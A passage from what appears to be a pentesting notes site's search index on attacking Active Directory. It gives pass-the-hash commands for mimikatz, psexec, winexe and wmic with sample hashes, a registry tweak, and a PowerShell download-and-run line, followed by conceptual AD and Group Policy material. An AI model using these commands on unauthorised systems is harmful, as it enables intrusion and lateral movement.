/run:\"mstsc.exe /restrictedadmin\"","title":"Implementations"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#why-is-it-not-working","text":"The user you are using must belong to the domain group Remote Desktop Users , or allow the user to to RDP to a specific host. If you want to RDP to a host that you already control (for example if you want to RDP to your physical computer that your client has provided) and you do not belong to the domain group Remote Desktop Users you can allow your domain user to RDP to your computer by doing the following: Go to: system properties / advanced Fj\u00e4rrsessioner V\u00e4lj anv\u00e4ndare (Select your user) Unclick \"Till\u00e5t bara bara anslutningar som anv\u00e4nder ...\" It might be that the computer you are trying to access Restricted Admin mode disabled. This means that you can't use PTH to RDP to it. But if you have a shell you can just enable it, like this: First you create a new shell as the user you are impersonating. mimikatz.exe \"sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe\" After that you just create a new powershell session on your target machine, and then you disable the restriction, like the follwing: Enter-PSSession -Computer <Target> New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" -PropertyType DWORD -Force","title":"Why is it not working?"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#server-message-block-smb","text":"Port: 445/TCP, 135/TCP, High Random Port Tools: Impacket, Metasploit, SysInternals, There are various tools that leverage the SMB protocol together with RPC to remotely interact with a computer, the most famous is PsExec included in SysInternals . In order to use the technique the user must either be a domain user with local administrator permission, or be the local user Administrator . The best tool to use is PsExec.py by Impacket, for e few reasons: it can speak SMBv2, it is not caught by Windows Defender, it can be used by pass the hash. Most implementations work like this: 1. It mounts the share admin$ . 2. Adds an executable there. 3. Creates a new service using Service Control Manager (SCM) , and link that to the executable. 4. Starts the service.","title":"Server Message Block (SMB)"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#implementations_1","text":"There are many implementations of this technique. Impacket psexec.py hackdomain/pelle@192.168.66.88 psexec.py Administrator@192.168.66.88 psexec.py -hashes 00000000000000000000000000000000:88e4d9fabaecf3dec18dd80905521b29 user@192.168.66.88 smbexec.py evilcorp.local/philip@192.168.77.12 Metasploit PsExec_psh The metasploti-module exploit/windows/smb/psexec_psh creates a service, but instead of uploading an executable to disk the service is started with a powershell command, something like this: powershell.exe IEX (new-object Net.WebClient).DownloadString(\"http://...script.ps1\"); invoke-thescript Metasploit psexec Otherwise you can also use metasploit exploit windows/smb/psexec but it can't hand \u00c5\u00c4\u00d6. SysInternals / PsExec.exe psexec.exe \\\\192.11.11.11 -u Administrat\u00f6r cmd.exe WinEXE / PTH-WinEXE winexe is a linux-port of Sysinternals PsExec. pth-winexe just adds the pass-the-hash function. Can be accessed from kali repo with: sudo apt-get install passing-the-hash winexe --uninstall --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" pth-winexe --uninstall--user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" # To escalate to system winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\" pth-winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 \"cmd.exe\"","title":"Implementations"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#why-is-it-not-working_1","text":"Access Denied If you try to use PsExec , but when you do you get the response Access Denied , the most likely scenario is that the following registry key is set: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy This blocks local admin users with the User Account Control (UAC) security mechanism. Share is not writable If you try to authenticate using a local account that belongs to the Administrators group you might get the error below. This is because a non-default local administrator account can't write to ADMIN$ . [-] share 'ADMIN$' is not writable. [-] share 'C$' is not writable. SMBv1 is disabled If you use winexe against a windows 10 machine, you might get this error ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET . This is most likely because winexe is using SMBv1, which is disabled by default on Windows 10. Anti-virus It might be that the payload gets caught by anti-virus. Metasploits exploit/windows/smb/psexec_psh , and exploit/windows/smb/psexec both get caught by windows-defender, for example. Not a true admin account Local admin accounts (that are not the builtin Administrator accounts) can't use PSEXEC because since Windows patched that. But the default 500 Administrator always can.","title":"Why is it not working?"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#winrm-windows-remote-managements","text":"Port: 5985/TCP/HTTP, 5986/TCP/HTTPS Tools: WinRM, Enter-PSSession, Invoke-Command First let's try to understand the common terminology. WinRM: Windows Remote Management, is Microsoft\u2019s implementation of the WS-Management protocol WS-Management: Web Services-Management, is an open standard that is based on SOAP messages to remotely exchange messaging data WinRS: Windows Remote Shell is a function of WinRM and is used to create a shell remotely on a Windows host and execute commands. This is usually what most open source libraries that claim WinRM support work with PSRP: PowerShell Remoting Protocol is a separate protocol that runs over WinRM, this is the protocol that is used when executing a command with Invoke-Command or Enter-PSSession and has some differences with WinRS","title":"WinRM / Windows Remote Managements"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#implementations_2","text":"The following are some tools that use WinRM. PowerShell PSRemoting New-PSSession -ComputerName <computername> -Credential (Get-Credential) Enter-PSSession <host> -Credential <domain>\\<user> Invoke-Command <host> -Credential $cred -ScriptBlock {Hostname} # Upload file to remote session Copy-Item -Path C:\\Temp\\PowerView.ps1 -Destination C:\\Temp\\ -ToSession (Get-PSSession) # Download file from remote session Copy-Item -Path C:\\Users\\Administrator\\Desktop\\test.txt -Destination C:\\Temp\\ -FromSession (Get-PSSession) $SecPassword = ConvertTo-SecureString 'supersecretpassword' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('domain\\dfm.a', $SecPassword) Connect-WSMan -Credential $Cred -ComputerName targetmachine","title":"Implementations"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#why-is-it-not-working_2","text":"No WinRM server is running If you have access to the computer you can enable WinRM. This is probably not something you want to do. Because by default I think it will go over HTTP, and you will not want to authenticate over HTTP. But FYI this is how it is done: winrm quickconfig Enable-PSRemoting","title":"Why is it not working?"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#wmi-windows-management-instruments-wmic","text":"WMI: Windows Management Instruments WMIC: Windows Management Instruments Command-line Ports: 135 (Default. DCOM) Port: 5986 (if WinRM is used) WMI can be used locally. But from an attackers perspective is how we can use it remotley, over the network. When used over the network two protocols are used: WinRM and DCOM. WMI is based on a client-server model. There are many different clients, the following are some native windows clients: wmic.exe PowerShell (A number of cmdlets can be used) VBScript JScript wbemtest.exe C/C++ via COM winrm.exe winrs.exe The server is: WMIService (WINmgmt) DCOM: Distributed Component Object Model, has been the default protocol used by WMI. It runs on port 135, subsequent data is transfered over randomly selected tcp port. All the windows built-in cmdlets and methods use DCOM as the default protocol. WinRM: WinRM has superseded DCOM as the default protocol for remote WMI communication. There are usually two methods to achieve code execution with WMI, those are: Win32_Process Create method and event consumers. So what most hacking tools for lateral movement do is to create a new process and create cmd for example.","title":"WMI / Windows Management Instruments / WMIC"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#implementations_3","text":"","title":"Implementations"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#impacket","text":"wmiexec","title":"Impacket"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#pth-wmis","text":"sudo apt-get install passing-the-hash pth-wmis root@Kali:~# pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 \"select Name from Win32_UserAccount\" root@Kali:~# pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 \"cmd.exe /c whoami > c:\\temp\\result.txt\" root@Kali:~# pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25/c$ root@Kali:~# pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25","title":"pth-wmis"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#powershell-empire","text":"Invoke_wmi","title":"Powershell Empire"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#wmic","text":"Spawning a new process on the target system 10.0.0.6 from another compromised system 10.0.0.2: wmic /node:10.0.0.6 /user:administrator process call create \"cmd.exe /c calc\"","title":"WMIC"},{"location":"attacking_active_directory_domain/remote_access/remote_access/#why-is-it-not-working_3","text":"Check the port Is port 135 open on the target?","title":"Why is it not working?"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/","text":"Terminology # Active Directory Domain Services - AD DS # Active Directory uses the anology of a forest to explain the structure of an Active Directory. So you have: Forest, Tree, Branch, Leaf Forest The forest is the absolut top level of your AD structure. The forest means: all the domains. A forest can contain multiple domain container objects. Ie, many domains. In a company you can a have multiple forests. Tree A tree in AD referes to a Domain. The first domain in the forest is called the forest root domain. Leaf A leaf object is any objects that cannot contain another object. Examples of these are: Users, Computers, Groups. Design Principles of an Active Directory # An AD can be organized in many different ways, and there is not right answer, but there are many wrong answers. But a good idea is to structure the AD in the same way as the organisation is structured. These principles aren't mutually exclusive, usually they are combined. OUs are flexible objects, and the structure can be changed fairly easily. Map the organizations structure - OUs for major business units (HR, Economy, Sales, etc) Map the geographical structure - Create OUs based on geography, for example OU for each country, with sub-OUs in each city. Create separate OU for workstations and servers Create separate OUs for workstations and user - makes it easier to apply relevant GPOs. Good ideas: - Use a Standardize Naming Convention For example letter of first name + lastname. or \"svc_name\" for service accounts. Don't nest to many levels of OUs. How many is to many? If each OU has a separate GPO, it might taker longer time for the user to log in, because to many GPOs will be applied. Organizational Unit (OU) # OUs are containers of other AD objects. OUs are often used to logically separate users into managable units. For example, to have OU for each country where the company has offices. That country OU might then be separated into city specifc OUs. You can thus have an OU inside an OU. A user cannot belong to two OUs at the same time. An OU is a container. It is a container because an OU can contain other elements, such as users or computer. A group is not a container. A group is just a simple entry with the attribute \"members\". The value of that attribute defines who is a member of the group. The group can therefore not contain other entries/objects, like a OU can. There are basically two reasons to use OU: - Control the delegation of administrative responsibility. So that one user is able to administer all the users in one OU, but no other users. - To apply GPOs on a limited number of users the GPO can be associated with a specific OU. The OU is the smallest unit to which you can assign a GPO. You can't, for example assign a GPO to a generic container (such as Users and Computers). Those containers inherit the root GPOs though. It is best practice to not mix computer objects with user objects in OUs. Managed by This might seem as an intriguing attribute that all OUs have. Unfortunatly, it is not that interesting as it sounds. It doesn't give the user any additional permissions over the OU. It is more a label to know who is the business owner of that group. So maybe the boss over that business area. Containers # There are a few differences between a OU and a Container. The main difference is that you can't apply GPOs on containers, only on OUs. A container cannot be created using Active Directory Administrative Center (ADAC) or Active Directory Users and Computers (ADUC). Instead you need to use ADSI Edit, and you user must belong to the Schema Admins security group. By default the only user belonging to that group is the AD account Administrator. There are some containers that is good to know: - Builtin - stores a number of the default groups - Users - stores other default groups (such as Domain Admins). This is where new users are create if no OU is specified. - Computers - stores computer accounts when a new accounts is created, for example when a computer is joined to the domain. Active Directory Groups # Groups are used to collect user accounts, computer accounts, and other groups into manageable units. Working with groups instead of with individual users helps simplify network maintenance and administration. There are two types of groups in Active Directory: Distribution groups - Used to create email distribution lists. Security groups - Used to assign permissions to shared resources. For a security perspective it is of course the Security Groups that are of interest to use. Security Principal # You hear this term quite a bit. In Java and Microsoft terminology a Security Principal is an entity that can be authenticated. In practice this means user account, service account, computer account, or thread or process that runs in of a user account or computer account. Each security principal is represented by a unique Security Identifier (SID). Local Security Principals are managed by the Security Account Manager (SAM). Security identifiers (SID) # A SID is a value that is used to identify a unique Security Principal. Every time a user signs in the an access token is created for that Security Principal. If you come from a Web background you can simply understand the token as a cookie or a JWT. The token contains the user's SID, user rights, and the SIDs for the groups that the user belongs to. Apart from these specific SIDs there are also some well known SIDs, like Everyone and World . Access token # An access token is a protected object that contains information about a users SID, suer rights and SIDs for groups the user belongs to. When a user authenticates to a computer the whole authentication is performed. If the authentication is successful the process returns a SID and list of SIDs for the users security groups. The Local Security Authority (LSA) uses those SIDs to create an access token. After LSA create the primary access token a copy of that access token is attached to every process that the user initiates. Whenever an action needs to be performed that requires user rights the operating system need to check that the user has those priviliges. So it checks the associated token to see if it has the correct level of privilige. So it is just like a web-application. There are two types of access tokens: primary and impersonating . ACL - Access Control List # So when we talk about the possibility to edit an ACL, it is the ACL of a AD object (user, group, computer), not specific files. Access priviliges to certain AD resrouces are configured through Access Control Entries (ACE). An ACL is the collection of Access control entries for a specific object. So each object, such as a computer has an Access Control Entry, which is included in the Access Control List. So it is basically just a list of who gets access to the object, and what type of access (read, write,modify, delete, etc). An ACE refers to a specific security principal (User, Group, Computer,e tc). Example of interesting permissions a user can have of another object is: owner, writeOwner, genericALl, writeDACL. All these permissions can be abused to escalate priviliges. DACL/ # Discretionary Access Control Lists (DACL). DACL is just the group of ACEs.","title":"About Active Directory"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#terminology","text":"","title":"Terminology"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#active-directory-domain-services-ad-ds","text":"Active Directory uses the anology of a forest to explain the structure of an Active Directory. So you have: Forest, Tree, Branch, Leaf Forest The forest is the absolut top level of your AD structure. The forest means: all the domains. A forest can contain multiple domain container objects. Ie, many domains. In a company you can a have multiple forests. Tree A tree in AD referes to a Domain. The first domain in the forest is called the forest root domain. Leaf A leaf object is any objects that cannot contain another object. Examples of these are: Users, Computers, Groups.","title":"Active Directory Domain Services - AD DS"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#design-principles-of-an-active-directory","text":"An AD can be organized in many different ways, and there is not right answer, but there are many wrong answers. But a good idea is to structure the AD in the same way as the organisation is structured. These principles aren't mutually exclusive, usually they are combined. OUs are flexible objects, and the structure can be changed fairly easily. Map the organizations structure - OUs for major business units (HR, Economy, Sales, etc) Map the geographical structure - Create OUs based on geography, for example OU for each country, with sub-OUs in each city. Create separate OU for workstations and servers Create separate OUs for workstations and user - makes it easier to apply relevant GPOs. Good ideas: - Use a Standardize Naming Convention For example letter of first name + lastname. or \"svc_name\" for service accounts. Don't nest to many levels of OUs. How many is to many? If each OU has a separate GPO, it might taker longer time for the user to log in, because to many GPOs will be applied.","title":"Design Principles of an Active Directory"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#organizational-unit-ou","text":"OUs are containers of other AD objects. OUs are often used to logically separate users into managable units. For example, to have OU for each country where the company has offices. That country OU might then be separated into city specifc OUs. You can thus have an OU inside an OU. A user cannot belong to two OUs at the same time. An OU is a container. It is a container because an OU can contain other elements, such as users or computer. A group is not a container. A group is just a simple entry with the attribute \"members\". The value of that attribute defines who is a member of the group. The group can therefore not contain other entries/objects, like a OU can. There are basically two reasons to use OU: - Control the delegation of administrative responsibility. So that one user is able to administer all the users in one OU, but no other users. - To apply GPOs on a limited number of users the GPO can be associated with a specific OU. The OU is the smallest unit to which you can assign a GPO. You can't, for example assign a GPO to a generic container (such as Users and Computers). Those containers inherit the root GPOs though. It is best practice to not mix computer objects with user objects in OUs. Managed by This might seem as an intriguing attribute that all OUs have. Unfortunatly, it is not that interesting as it sounds. It doesn't give the user any additional permissions over the OU. It is more a label to know who is the business owner of that group. So maybe the boss over that business area.","title":"Organizational Unit (OU)"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#containers","text":"There are a few differences between a OU and a Container. The main difference is that you can't apply GPOs on containers, only on OUs. A container cannot be created using Active Directory Administrative Center (ADAC) or Active Directory Users and Computers (ADUC). Instead you need to use ADSI Edit, and you user must belong to the Schema Admins security group. By default the only user belonging to that group is the AD account Administrator. There are some containers that is good to know: - Builtin - stores a number of the default groups - Users - stores other default groups (such as Domain Admins). This is where new users are create if no OU is specified. - Computers - stores computer accounts when a new accounts is created, for example when a computer is joined to the domain.","title":"Containers"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#active-directory-groups","text":"Groups are used to collect user accounts, computer accounts, and other groups into manageable units. Working with groups instead of with individual users helps simplify network maintenance and administration. There are two types of groups in Active Directory: Distribution groups - Used to create email distribution lists. Security groups - Used to assign permissions to shared resources. For a security perspective it is of course the Security Groups that are of interest to use.","title":"Active Directory Groups"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#security-principal","text":"You hear this term quite a bit. In Java and Microsoft terminology a Security Principal is an entity that can be authenticated. In practice this means user account, service account, computer account, or thread or process that runs in of a user account or computer account. Each security principal is represented by a unique Security Identifier (SID). Local Security Principals are managed by the Security Account Manager (SAM).","title":"Security Principal"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#security-identifiers-sid","text":"A SID is a value that is used to identify a unique Security Principal. Every time a user signs in the an access token is created for that Security Principal. If you come from a Web background you can simply understand the token as a cookie or a JWT. The token contains the user's SID, user rights, and the SIDs for the groups that the user belongs to. Apart from these specific SIDs there are also some well known SIDs, like Everyone and World .","title":"Security identifiers (SID)"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#access-token","text":"An access token is a protected object that contains information about a users SID, suer rights and SIDs for groups the user belongs to. When a user authenticates to a computer the whole authentication is performed. If the authentication is successful the process returns a SID and list of SIDs for the users security groups. The Local Security Authority (LSA) uses those SIDs to create an access token. After LSA create the primary access token a copy of that access token is attached to every process that the user initiates. Whenever an action needs to be performed that requires user rights the operating system need to check that the user has those priviliges. So it checks the associated token to see if it has the correct level of privilige. So it is just like a web-application. There are two types of access tokens: primary and impersonating .","title":"Access token"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#acl-access-control-list","text":"So when we talk about the possibility to edit an ACL, it is the ACL of a AD object (user, group, computer), not specific files. Access priviliges to certain AD resrouces are configured through Access Control Entries (ACE). An ACL is the collection of Access control entries for a specific object. So each object, such as a computer has an Access Control Entry, which is included in the Access Control List. So it is basically just a list of who gets access to the object, and what type of access (read, write,modify, delete, etc). An ACE refers to a specific security principal (User, Group, Computer,e tc). Example of interesting permissions a user can have of another object is: owner, writeOwner, genericALl, writeDACL. All these permissions can be abused to escalate priviliges.","title":"ACL - Access Control List"},{"location":"attacking_active_directory_domain/understanding_active_directory/about_active_directory/#dacl","text":"Discretionary Access Control Lists (DACL). DACL is just the group of ACEs.","title":"DACL/"},{"location":"attacking_active_directory_domain/understanding_active_directory/ad_physical_topology/","text":"The Active Directory physical topology consists of three main components: site , subnet , and site link Site # A collection of machines connected of a LAN. This usually means a physical building. A site usually contains a domain controller , but it doesn't have to. If the site is in an unsecure location, where the physical security of a domain controller can't be assured, the DC might be a Read-only Domain Controller (RODC). Some services, such as Distributed File System (DFS) and SharePoint are site aware and use the site information- AD needs at least one site configured. The default site is created when the first domain in your forest is created. Subnet # Site link # A site link is used to configure which domain controller on a site a user should authenticate against. The two main functions it serves are the following: - The site links control the AD replication between domain controllers. - Provide a mechanism for a client to discover domain controllers if the DC on site is unavailable.","title":"AD Physical topology"},{"location":"attacking_active_directory_domain/understanding_active_directory/ad_physical_topology/#site","text":"A collection of machines connected of a LAN. This usually means a physical building. A site usually contains a domain controller , but it doesn't have to. If the site is in an unsecure location, where the physical security of a domain controller can't be assured, the DC might be a Read-only Domain Controller (RODC). Some services, such as Distributed File System (DFS) and SharePoint are site aware and use the site information- AD needs at least one site configured. The default site is created when the first domain in your forest is created.","title":"Site"},{"location":"attacking_active_directory_domain/understanding_active_directory/ad_physical_topology/#subnet","text":"","title":"Subnet"},{"location":"attacking_active_directory_domain/understanding_active_directory/ad_physical_topology/#site-link","text":"A site link is used to configure which domain controller on a site a user should authenticate against. The two main functions it serves are the following: - The site links control the AD replication between domain controllers. - Provide a mechanism for a client to discover domain controllers if the DC on site is unavailable.","title":"Site link"},{"location":"attacking_active_directory_domain/understanding_active_directory/default_groups/","text":"# There are some default groups in Active Directory. Those groups are found in two containers: Builtin and in Users . The groups in Builtin are analogous to the local groups found on a Windows Server. The AD specific groups are instead found in the container Users . All the groups have SIDs that are well known, and the same SID in every AD. Both Builtin and Users are containers but not OUs. That is deliberate, because Group Policies can't be applied containers. So you can't accidentally apply a GPO to those containers. In a sense the Builtin groups are a legacy feature, and many of the groups are not really appropriate. For example, Builtin groups # Operators # Account Operators","title":"Default Groups"},{"location":"attacking_active_directory_domain/understanding_active_directory/default_groups/#builtin-groups","text":"","title":"Builtin groups"},{"location":"attacking_active_directory_domain/understanding_active_directory/default_groups/#operators","text":"Account Operators","title":"Operators"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/","text":"The Domain Controller (DC) is the server that is running the Active Directory Domain Services. Primary/backup vs Multimaster domain controllers # There are often at least two domain controllers in a forest. In Windows NT t Before Active Directory was introduced with Windows 2000 the Domain Controllers were structured in a master-worker relationship where you had one DC functioning as the Primary DC and all other DCs were backup domain controllers. Back then it was only possible for the Primary DC to make domain changes - such as adding new users. The changes were then replicated to the backup domain controllers. This structure was deprecated when Active Directory was introduced in Windows 2000. Instead the architecure is based on a multimaster replication. That means that any writable DC can make changes, like adding a user, and that change will then be replicated to the other domain controllers. Flexible Single Master Operation (FSMO) / Single Master Operation / Operations Master # So Domain Controllers in modern Active Directory use a multi-master structure, they replicate between each other all the time. However, there are certain tasks that are not so well suited for multi-master replication. These activities are called FSMO Roles, and there are five roles. Two on the forest level, and three on the domain level. FSMO Roles Schema Master - Forest - Schema updates are processed on this DC. Domain Naming Master - Forst - Controls changes to the forest, such as addition and removal of domains. PDC Emulator - Domain - See below RID Master - Domain - Relative Identifier (RID) Master issues pools of unique identifiers to domain controllers for them to use when new objects are created. Infrastructure Master - Domain - Maintains references to objects in other domains; for example, users in another domain who are member of a group in the current domain. The first DC that is create in a in a forest performs all these roles. When a new domain is created the three domain-level services are hosted on the domain controller in that domain. Primary Domain Controller (PDC) Service Originally the Emulated Primary Domain Controller (PDC) service was created to be backwards compatible with pre-Window 2000 systems. On one DC there is a service running which is called PDC . You can find out which Domain Controller that is emulating the role of Primary DC with the following command: get-addomaincontroller -discover -service PrimaryDC The PDC Emulator have some new responsibilities. Responsible for changing passwords and monitoring user locks for password errors. The Group Policy Editor by default connects to the PDC Emulator server and all changes to the GPO in reality occur on it. By default, the PDC Emulator is the time server for the clients in the domain. Changes to the Distributed File System (DFS) namespace are made on the domain controller with the PDC Emulator role. The process of increasing the domain or forest functional level is performed on the Primary Domain Controller Emulator. Active Directory has so-called Well Known Security principals. Examples are the Everyone, Authenticated Users, System, Self, and Creator Owner. They are all managed by a domain controller with the PDC Emulator role. Writable DC vs Read-only DC (RODC) # There are two types of Domain controllers Writable DC and a Read-only DC Writable DC This is just the standard Domain Controller. Read-only DC (RODC) Forest Function Level # References # https://adsecurity.org/?p=3592","title":"Domain Controller"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/#primarybackup-vs-multimaster-domain-controllers","text":"There are often at least two domain controllers in a forest. In Windows NT t Before Active Directory was introduced with Windows 2000 the Domain Controllers were structured in a master-worker relationship where you had one DC functioning as the Primary DC and all other DCs were backup domain controllers. Back then it was only possible for the Primary DC to make domain changes - such as adding new users. The changes were then replicated to the backup domain controllers. This structure was deprecated when Active Directory was introduced in Windows 2000. Instead the architecure is based on a multimaster replication. That means that any writable DC can make changes, like adding a user, and that change will then be replicated to the other domain controllers.","title":"Primary/backup vs Multimaster domain controllers"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/#flexible-single-master-operation-fsmo-single-master-operation-operations-master","text":"So Domain Controllers in modern Active Directory use a multi-master structure, they replicate between each other all the time. However, there are certain tasks that are not so well suited for multi-master replication. These activities are called FSMO Roles, and there are five roles. Two on the forest level, and three on the domain level. FSMO Roles Schema Master - Forest - Schema updates are processed on this DC. Domain Naming Master - Forst - Controls changes to the forest, such as addition and removal of domains. PDC Emulator - Domain - See below RID Master - Domain - Relative Identifier (RID) Master issues pools of unique identifiers to domain controllers for them to use when new objects are created. Infrastructure Master - Domain - Maintains references to objects in other domains; for example, users in another domain who are member of a group in the current domain. The first DC that is create in a in a forest performs all these roles. When a new domain is created the three domain-level services are hosted on the domain controller in that domain. Primary Domain Controller (PDC) Service Originally the Emulated Primary Domain Controller (PDC) service was created to be backwards compatible with pre-Window 2000 systems. On one DC there is a service running which is called PDC . You can find out which Domain Controller that is emulating the role of Primary DC with the following command: get-addomaincontroller -discover -service PrimaryDC The PDC Emulator have some new responsibilities. Responsible for changing passwords and monitoring user locks for password errors. The Group Policy Editor by default connects to the PDC Emulator server and all changes to the GPO in reality occur on it. By default, the PDC Emulator is the time server for the clients in the domain. Changes to the Distributed File System (DFS) namespace are made on the domain controller with the PDC Emulator role. The process of increasing the domain or forest functional level is performed on the Primary Domain Controller Emulator. Active Directory has so-called Well Known Security principals. Examples are the Everyone, Authenticated Users, System, Self, and Creator Owner. They are all managed by a domain controller with the PDC Emulator role.","title":"Flexible Single Master Operation (FSMO) / Single Master Operation / Operations Master"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/#writable-dc-vs-read-only-dc-rodc","text":"There are two types of Domain controllers Writable DC and a Read-only DC Writable DC This is just the standard Domain Controller. Read-only DC (RODC)","title":"Writable DC vs Read-only DC (RODC)"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/#forest-function-level","text":"","title":"Forest Function Level"},{"location":"attacking_active_directory_domain/understanding_active_directory/domain_controller/#references","text":"https://adsecurity.org/?p=3592","title":"References"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/","text":"Group Policies # Group Policy is a method for configuring the computers in your forest. The policies can be applied to the Computer or to the User . Group Policy has nothing to do with Groups. They are completely separated components. An instance of a Group Policy is usually called Group Policy Object (GPO). A GPO can be used to, for example, set the screensaver on a computer, specify which control panel options should be available to the user, which programs should be showed in the start menu. The settings can then be applied to set of user or computer objects by linking the GPO with a OU or a Domain. A GPO can be applied to a Site, Domain and OU. It cannot be applied to a container (such as Builtin or Users ). Group Policies are extremly powerful, and a misconfigured GPO can shutdown the operation of an company. It is also extremly granular. You can make detailed changes applied to only a few objects in a specific OU. There are some best practices that are good to keep in mind when using GPOs: Keep user and computer settings in different GPOs. Apply the smallest number of GPOs to solve the problem. Try to avoid duplicating settings in differnt GPOs. Two GPOs are create by default when you first install Active Directory: Default Domain Policy - Basically only sets the Password and lockout policy. Default Domain Controllers Policy - Set security configurations for the Domain Controllers. It is common to not edit the default policies and instead create new ones. If you mess things up, you can just remove those policies and you always have the default ones clean. Started GPOs It is common to create template GPOs, these are called Starter GPOs. These can be used if you need to create multiple GPOs that share a lot of configurations, but differ on some. Working with GPOs # GPOs are managed from the \"Group Policy Management Console\" (GPMC or just GPM). In broad strokes a GPO allows for computer configuration and user configurations. Computer configuration - applied to the computer irrespective of the user who logged on. User configuration - applied to the user irrespective of the computer they're using. Both of these configurations (User and computer) have Policies and Preference settings. Policies for user configuration are placed in the HKEY_CURRENT_USER (HKCU) area of the Registry, while those for computer configurations are placed in the HKEY_LOCAL_MACHINE (HKLM) area. Policies Policies contain settings that have been available since Group Policy was introduced in Windows 2000. These are thousands of settings that can be done. They are divided up in three groups: Software settings, Windows settings, and Administrative Template. Both User and Computer configurations have the same main categories (Software, Windows, Administrative Template). But the differe. So some configurations are only available for Computers, and other are only Available for Users. In fact, the Computer Configuration branch has 1644 settings available, whereas the User Configuration branch has 1453 settings available. Computer policies are the following: Software settings - Used to automatically install programs. You configure a UNC path to a .msi and that package will be installed the assigned computer, or the computer where a user log in. Windows settings - DNS, Startup/shutdown scripts, Deploy printer, and Security - firewall rules, trusted root certificate, password options, audit logs. Administrative Template - This is where the majority of configurations are. Not really use the difference between Windows settings and Administrative Template. Preferences Preferences are what they sound like: they are what is prefered. This means that they can be overridden by a user. It is just a preference, not a law. Before prefences was included in Windows 2008 many configurations were configured through logon-scripts. Things that are configured with Preferences are: - Drive and printer mappings - Power scheme management - File and folder management, including creating and deleting files and folders - Applications - Network share management - Scheduled tasks (This is where the GPP-vuln is found - see (Passwords in Group Policy Preferences)[../active_directory_privilege_escalation/passwords_in_group_policy_preferences]) - Services - Also suceptible to GPP-vuln. It is possible, and probably a good idea, to disable all User configurations if a GPO is suppose to be applied only to Computers, and vice verse. This can be done in the Applying GPOs # The process of applying a GPO to a specific container (Site, Domain, OU) is usually called linking. If you haev a GPO but it is not linked to any container then it doesnt really do anything. You can link and unlink a GPO. You usually do this but opening the GPMC and then either click on a container and create a new GPO. Or create a GPO in \"Group Policy Objects\" and then drag the GPO to the container you want to link it to. It usually takes up to 90 minutes for the computers in the domain to poll for the new GPOs, this can be bypassed by runnign the command gpupdate /force . Security updates cna take up to 16 hours. Domain Controllers update GPOs every 5 minutes. Order of applying GPOs # Site Domain OU Nested OU If multiple GPOs have made the same GPO change, the lowest in the chain (closes to the leaf) is the one that will be applied. BLocking and overriding # Blocknig inheritance GPOs are inherited by OUs. So if one OU has a GPO linked to it, the GPO will be applied to all the sub-OUs. The GPO is therefore inherited. If you do not want sub-OUs to inherit GPOs you can configure that OU to block inheritance. Overriding / Enforced If an OU has blocked the inheritance it is still possible to override that setting by configuring the GPO above to be Enforced. If it is enforced the below OUs can't block inheritance. Filtering # Group It is possible to filter whom the GPO will be applied to further. This cna be done with the Filter options. You can add Groups, and only the users belonging to that group will have the GPO applied. The default is \"Authenticated users\". WMI Filter You can also filter whom the GPO will be applied to by using WMI filters. With WMI you can filter on computer disk space, OS version, etc","title":"Group Policies"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#group-policies","text":"Group Policy is a method for configuring the computers in your forest. The policies can be applied to the Computer or to the User . Group Policy has nothing to do with Groups. They are completely separated components. An instance of a Group Policy is usually called Group Policy Object (GPO). A GPO can be used to, for example, set the screensaver on a computer, specify which control panel options should be available to the user, which programs should be showed in the start menu. The settings can then be applied to set of user or computer objects by linking the GPO with a OU or a Domain. A GPO can be applied to a Site, Domain and OU. It cannot be applied to a container (such as Builtin or Users ). Group Policies are extremly 